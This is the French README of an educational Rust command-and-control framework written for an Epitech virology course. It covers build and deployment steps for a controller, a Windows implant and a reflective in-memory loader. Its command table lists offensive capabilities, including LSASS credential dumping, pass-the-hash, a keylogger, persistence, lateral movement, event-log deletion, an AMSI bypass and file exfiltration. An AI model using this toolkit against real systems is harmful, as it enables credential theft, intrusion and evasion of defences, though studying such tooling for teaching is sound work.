# virology-rs

Framework C2 (Command & Control) éducatif écrit en Rust, développé dans le cadre du module **T-SEC-901 Virology** (Epitech).

## Architecture

| Composant | Rôle | Crate |
|-----------|------|-------|
| **Controller** | Serveur HTTPS (axum + rustls), interface admin web, console interactive | `controller/` |
| **Implant** | Agent Windows, beacon chiffré, 19 modules de post-exploitation | `implant/` |
| **Loader** | Téléchargeur + chargeur PE reflectif en mémoire | `loader/` |

### Protocole de communication

```
Implant ──HTTPS──▶ Controller
         RSA-OAEP-SHA256 (échange de clé)
         AES-256-GCM (frames : [16B id][12B nonce][ciphertext+tag])
```

Le cert pinning (SHA-256) et la rotation de User-Agent assurent l'intégrité du canal.

## Prérequis

- Rust ≥ 1.75 (toolchains `x86_64-pc-windows-gnu` et native)
- OpenSSL (pour la génération de certificats)
- Python 3 + `pycryptodome` (pour le chiffrement du payload loader)

## Installation

### 1. Générer les certificats TLS

```bash
./keygen.sh
```

Copier l'empreinte SHA-256 affichée (elle sera compilée dans l'implant).

### 2. Compiler le controller (Linux)

```bash
cargo build --release -p controller
```

### 3. Compiler l'implant (Windows)

```bash
C2_URL="https://c2.example.com:8443" \
C2_FINGERPRINT="<empreinte SHA-256>" \
cargo build --release -p implant --target x86_64-pc-windows-gnu
```

### 4. Compiler le loader (Windows)

Mettre à jour `OBF_URL` et `OBF_KEY` dans `loader/src/main.rs`, puis :

```bash
cargo build --release -p loader --target x86_64-pc-windows-gnu
```

### 5. Chiffrer le payload pour le loader

```bash
python3 encrypt_payload.py target/x86_64-pc-windows-gnu/release/implant.exe payload.bin
```

## Utilisation

### Lancer le controller

```bash
./target/release/controller \
    --cert certs/server.crt \
    --key certs/server.key \
    --port 8443
```

Options : `--interval`, `--jitter`, `--payload`, `--payload2`, `--headless`, `--db`.

### Interface admin

Accessible via `https://<controller>:8443/admin` — tableau de bord avec gestion des sessions, terminal interactif et actions rapides.

### Console interactive

Sans `--headless`, une console CLI permet :
- `implants` — lister les sessions
- `use <n>` — sélectionner un implant
- `shell <cmd>` — exécuter une commande
- `upload <fichier>` — envoyer un fichier
- `results` — voir les résultats

## Commandes de l'implant

| Commande | Description |
|----------|-------------|
| `shell <cmd>` | Exécution via cmd.exe / sh |
| `bshell <ls\|ps\|pwd\|env\|whoami>` | Shell intégré (sans sous-processus) |
| `creds` | Dump LSASS (MiniDumpWriteDump) |
| `credsmachine` | Export SAM/SYSTEM |
| `crack <hash> [wordlist]` | Cassage NTLM/MD5 |
| `pth <user> <hash> <domain>` | Pass-the-hash NTLMv2 |
| `keylog <start\|stop\|dump>` | Keylogger (WH_KEYBOARD_LL) |
| `screenshot` | Capture d'écran GDI |
| `persist` / `unpersist` | Persistance (4 mécanismes) |
| `privesc` | Audit + exploitation de privilèges |
| `rdp <on\|off>` | Activer/désactiver RDP |
| `propagate [scan\|spread <ip>]` | Scan réseau + mouvement latéral |
| `loot [collect]` | Inventaire fichiers sensibles |
| `logroll [log] [minutes]` | Suppression sélective d'événements |
| `detect` | Contrôles anti-analyse |
| `avscan <fichier>` | Scan Defender |
| `syscall` | AMSI bypass + direct syscall ntdll |
| `whatever` | Profil complet de la cible |
| `download <chemin>` | Exfiltrer un fichier |
| `upload <chemin>` | Déposer un fichier |

## Ressources et sources

- [The Rust Programming Language](https://doc.rust-lang.org/book/)
- [axum documentation](https://docs.rs/axum/)
- [windows-sys crate](https://docs.rs/windows-sys/)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [PE format specification](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [Reflective DLL Injection — Stephen Fewer](https://github.com/stephenfewer/ReflectiveDLLInjection)
